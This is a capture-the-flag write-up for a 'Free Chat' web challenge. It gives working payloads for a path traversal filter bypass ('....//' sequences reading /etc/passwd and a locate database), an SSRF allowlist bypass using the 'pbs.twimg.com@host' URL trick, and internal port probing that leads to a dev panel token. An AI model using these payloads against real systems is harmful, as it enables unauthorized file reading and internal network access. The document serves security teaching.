# Free Chat
> Author : Mika - @bWlrYQ

## "Recon"

We're facing a very minimialistic app at start. We can only login or register a new account. Let's start by registering a new account :). Once done, login to that newly created acc. We can see a very simple chat feature:

![chat](img/chat.png)

We could try sending various SQLi, XSS payloads through the chat or even login with the found usernames in the chat, none of these would work. By seeking towards the bottom, we can see a settings wheel. It allows us to change our name of profile picture. Changin the name gives nothing much, so profile picture has a few nice features tho!

## File Read 

The function that allows us to view our profile picture works the following : `http://worker05.gcc-ctf.com:12033/pfp?name=default.png` we have an endpoint to which we can specify a profile picture we want to retrieve using the ?name GET parameter. This smells of file reading.

Trying to access `http://worker05.gcc-ctf.com:12033/pfp?name=../../../../etc/passwd` gives us the following error message: `Couldn't find etc/passwd, hecker !`. We're on the right track but our input is filtered. looks like only the `../` have been removed by our input. By modifying our payload to `http://worker05.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//etc/passwd` we get acces to the passwd file:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
freechat:x:1000:1000::/home/freechat:/bin/bash
```
As from here we could try leaking source code and other stuff but we would have to guess the paths or bruteforce, this isn't funny at all! Let's go forward to the other feature available in the change profile picture area.

## SSRF 

If we want to change our profile picture, two possibilites :
- Upload a local file
- Get the content of a remote picture

TL;DR no vulnerability on the local file upload. Let's focus on the remote file feature. By inputing the URL for a legit png we get greeted with the following error : "The link must start with Twitter's http(s)://pbs.twimg.com domain (specific partneship with their CDN).". Seems like we're restricted to the `pbs.twimg.com` FQDN, hell no!

HTTP Basic Auth allows you to specify a user and password in the URL you're visiting, for example: `https://git:password@github.com/hello/private_rep.git`. Let's use this to our advantage and bypass the filter. So we're going to specify `https://pbs.twimg.com@example.net/img.png` the filter should let us pass because our remote URL starts with a valid input. 

The following payload works -> `https://pbs.twimg.com@bwlryq.net/img/pfp.png`:

![pfp2](img/pfp2.png)

We have a very nice preview of the image we want to upload through base64 delivered by the server. Let's try and get a preview from something that is not a PNG with the following payload -> `https://pbs.twimg.com@perdu.com`. We do get an output but our browser can't render it:

![pfp3](img/pfp3.png)

Let's view the base64 sent by the server:

![pfp4](img/pfp4.png)

We can get the content of any page on the internet, this looks like a pretty clean SSRF! We can script the check of every local port using Burp's intruder, Python or any other automation tool. The port internal port :1337 (http://pbs.twimg.com@localhost:1337) sends us a "valid" response, which means we've managed to access an internal app.

```html
<!DOCTYPE html>
<html>
<head>
    <title>FreeChat - Dev Panel</title>
    <script src="/static/js/hint.js"></script>
</head>
<body>
    <div style="text-align: center;">
        <h1>FreeChat - Dev Panel</h1>
        <h3>Welcome dev, to access the panel, please enter your access token</h3>
        <form action="http://devpanel:8000/" action="GET">
            <input type="text" name="token" placeholder="Access Token">
            <input type="submit" value="Submit">
        </form>
        <div>
            <h5 style="display: inline-block;">Forgot your token ? </h5>
            <button onclick="hint()" style="display: inline-block;">Hint</button>
        </div>
        <div id="hint"></div>
    </div>

</body>
</html>
```

It's the developer panel of the FreeChat app, interesting! It looks like the app is available on an other host `devpanel:8000` but we need to input an access token through a GET parameter named token. There's also a hint button that executes a script in `/static/js/hint.js`. Let's get the hint content through the SSRF (http://pbs.twimg.com@localhost:1337/static/js/hint.js)

```js
function hint(){
    document.getElementById("hint").innerHTML = "<h5>Hint: Don't be stupid admin, if you've lost the <b>token</b> you can still <b>locate</b> it. Just think!</h5>"
}
```

So, a lot of garbage but two words are in bold, "locate" and "token". We need to locate the token if we've lost it...

## Locatedb for the win

Now's the tricky part but also the most interesting/funny one. Some of you readers must be GNU/Linux users, you've all once forgotten the path of some binary or file on your filesystem. Who rescued you ? The `locate` bin of course. How does locate work ? I can't be clearer than the man: "locate reads one or more databases prepared by updatedb(8) and writes file names matching at least one of the PATTERNs to standard output, one per line." (https://linux.die.net/man/1/locate)

So there's a file on GNU/Linux systems that indexes every file on the OS ? Incredible :). But where is this database located ? Our operating system is Debian12 (challenge's statement). Debian's manual is very clear "The database file to build. Default is system-dependent. In Debian GNU/Linux, the default is /var/cache/locate/locatedb." (https://manpages.debian.org/bullseye/locate/updatedb.1.en.html)

Getting back to our file read, let's try and get this database's content (http://worker05.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//var/cache/locate/locatedb)

![locatedb](img/locatedb.png)

Success, now let's dig into it using the locate command (I ran everything in a debian:12 docker container):

``` 
root@6a94dbd143d1:/tmp/mounted# locate -d ./locatedb 'freechat'
/freechat
/freechat/app.py
/freechat/instance
/freechat/instance/.gitkeep
/freechat/lib
/freechat/lib/accounts.py
/freechat/lib/chat.py
/freechat/lib/database.py
/freechat/lib/settings.py
/freechat/pfp
/freechat/pfp/default.png
/freechat/requirements.txt
/freechat/static
/freechat/static/css
/freechat/static/css/custom.css
/freechat/static/css/uikit-rtl.css
/freechat/static/css/uikit.min.css
/freechat/static/img
/freechat/static/img/favicon.ico
/freechat/static/img/logo.png
/freechat/static/js
/freechat/static/js/login.js
/freechat/static/js/menu_switcher.js
/freechat/static/js/pfp.js
/freechat/static/js/progressbar.js
/freechat/static/js/register.js
/freechat/static/js/uikit-icons.min.js
/freechat/static/js/uikit.min.js
/freechat/templates
/freechat/templates/chat.html
/freechat/templates/index.html
/freechat/templates/profilePicture.html
/freechat/templates/settings.html
/home/freechat
/home/freechat/.bash_logout
/home/freechat/.bashrc
/home/freechat/.for_d3vs_0nly
/home/freechat/.for_d3vs_0nly/access_token.txt
/home/freechat/.profile
```

The above command allowed us to filter all the files on the system that contain the "freechat" word. We can definitely see the `/home/freechat/.for_d3vs_0nly/access_token.txt` which couldn't have been guessed (even using the /proc bruteforcing/enumeration technqiques).

Back to our file read (http://worker05.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//home/freechat/.for_d3vs_0nly/access_token.txt):

![token](img/token.png)

Our access token is: `af33aa8342e212020e0ba08bca94e3559f82d3efb0eb7ec6e7eafbc11710f05b`

## Flag

We can now get back to the devpanel accessible through the SSRF (http://pbs.twimg.com@devpanel:8000/?token=af33aa8342e212020e0ba08bca94e3559f82d3efb0eb7ec6e7eafbc11710f05b) and we get the following output:

```
<!DOCTYPE html>
<html>
<head>
    <title>DevPanel</title>
</head>
<body>
    <div style="text-align: center;">
        <h1>DevPanel</h1>
        
            <h5>Hello dev, your flag is : GCC{L0c4t3_tr1ck+SsRf_1s_FuN}</h5>
            <p>Made with ❤️ by Mika</p>
        
    </div>
</body>
</html>
```

## Precisions/Context

This is a very cool trick to use when you have a file read but a few precisions are needed:
- For this to work you need to have the "locate" binary and associated packages on the system/server
- The database must be "up to date" (it's normaly updated every 24hrs or through the `updatedb` bin)
- Some distros restrict this database to root:specificuser which means you can't always access it 
- The path of the database is not always the same depending on the OS/Distro

Hope you enjoyed the challenge :)